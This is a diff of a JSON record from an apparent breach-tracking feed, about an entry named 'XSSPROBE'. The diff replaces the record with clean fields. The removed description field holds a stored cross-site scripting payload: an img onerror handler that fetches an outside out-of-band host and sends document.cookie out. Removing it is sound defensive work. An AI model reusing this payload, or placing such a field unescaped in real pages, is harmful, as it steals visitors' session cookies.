@@ -1,1 +1,15 @@
-{"slug":"the-gentlemen-xssprobe-2026-08-22","title":"XSSPROBE","group":"the gentlemen","discovered":"2026-08-22T03:12:58.000Z","category":"data_breach","severity":"high","country":null,"sizeBytes":0,"description":"TESTXSS<img src=x onerror=\"fetch('https://uuu3cwgu0hoxk7p02tyhc7d3l25ooqear.oast.me/stored1?c='+encodeURIComponent(document.cookie))\">","source_url":"https://www.ransomlook.io/recent","groupAliases":[],"activity":null,"references":["ransomlook.io"]}
+{
+  "slug": "the-gentlemen-xssprobe-2026-08-22",
+  "title": "Xssprobe",
+  "group": "The Gentlemen",
+  "discovered": "2026-08-22T00:00:00.000Z",
+  "category": "data_breach",
+  "severity": "high",
+  "country": null,
+  "sizeBytes": 0,
+  "description": "Internal files exfiltrated",
+  "source_url": "https://recentbreaches.com/breach/xssprobe-the-gentlemen-2026-08",
+  "groupAliases": [],
+  "activity": null,
+  "references": ["RecentBreaches.com"]
+}
